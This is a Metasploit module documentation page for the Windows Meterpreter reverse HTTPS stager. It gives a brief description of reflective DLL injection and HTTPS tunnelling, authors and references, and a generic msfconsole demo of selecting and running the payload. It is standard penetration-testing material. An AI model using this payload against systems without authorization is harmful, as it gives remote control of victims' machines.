## Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (wininet)

Inject the meterpreter server DLL via the Reflective Dll 
Injection payload (staged). Tunnel communication over HTTPS 
(Windows wininet)


## Module Name
payload/windows/meterpreter/reverse_https

## Authors
* skape
* sf
* OJ Reeves
* hdm


## References
* https://github.com/stephenfewer/ReflectiveDLLInjection
* https://github.com/rapid7/ReflectiveDLLInjection




## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/meterpreter/reverse_https
msf payload(reverse_https) > show targets
   ... a list of targets ...
msf payload(reverse_https) > set TARGET <target-id>
msf payload(reverse_https) > show options
   ... show and set options ...
msf payload(reverse_https) > run
```
    
    